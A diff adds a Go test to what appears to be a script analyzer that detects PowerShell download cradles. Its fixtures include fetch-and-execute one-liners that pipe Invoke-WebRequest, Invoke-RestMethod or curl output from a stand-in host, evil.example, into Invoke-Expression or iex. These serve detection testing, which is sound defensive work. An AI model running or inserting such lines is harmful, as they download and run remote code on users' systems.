@@ -66,6 +66,35 @@ func TestIngestFlowEndToEnd(t *testing.T) {
 	}
 }
 
+// TestCradleFlowEndToEndPowerShell is the PowerShell counterpart of
+// TestCradleFlowEndToEnd: a network fetch piped into a code-execution sink is
+// reported as a cradle flow through the whole pipeline, while a sink fed by a
+// local producer, the same two commands on separate lines, or a non-executing
+// consumer is not.
+func TestCradleFlowEndToEndPowerShell(t *testing.T) {
+	a := mustAnalyzer(t)
+	cases := []struct {
+		src  string
+		want bool
+	}{
+		{`Invoke-WebRequest https://evil.example/p.ps1 | Invoke-Expression`, true},
+		{`curl https://evil.example/x | iex`, true},
+		{`Invoke-RestMethod https://evil.example/x | Invoke-Expression`, true},
+		{"Invoke-WebRequest https://evil.example/p.ps1\nInvoke-Expression $x", false}, // separate lines: not a flow
+		{`Get-Content a.txt | Invoke-Expression`, false},                              // local producer, no network
+		{`Invoke-WebRequest https://evil.example/x`, false},                           // egress alone: not a flow
+		{`Invoke-WebRequest https://evil.example/x | Select-Object -First 1`, false},  // no code-execution sink
+	}
+	for _, tc := range cases {
+		rep := a.Analyze(LangPowerShell, tc.src)
+		got := len(rep.Score.CradleFlows) > 0
+		if got != tc.want {
+			t.Errorf("%q: cradle flow=%v, want %v (flows=%d, effects=%d)",
+				tc.src, got, tc.want, len(rep.Score.CradleFlows), len(rep.Effects))
+		}
+	}
+}
+
 // TestFlowReportJSONRoundTrip pins that the new report fields survive
 // encode/decode: the emitted document carries score.cradleFlows and
 // score.ingestFlows, and decoding it back reproduces the same source/sink keys.
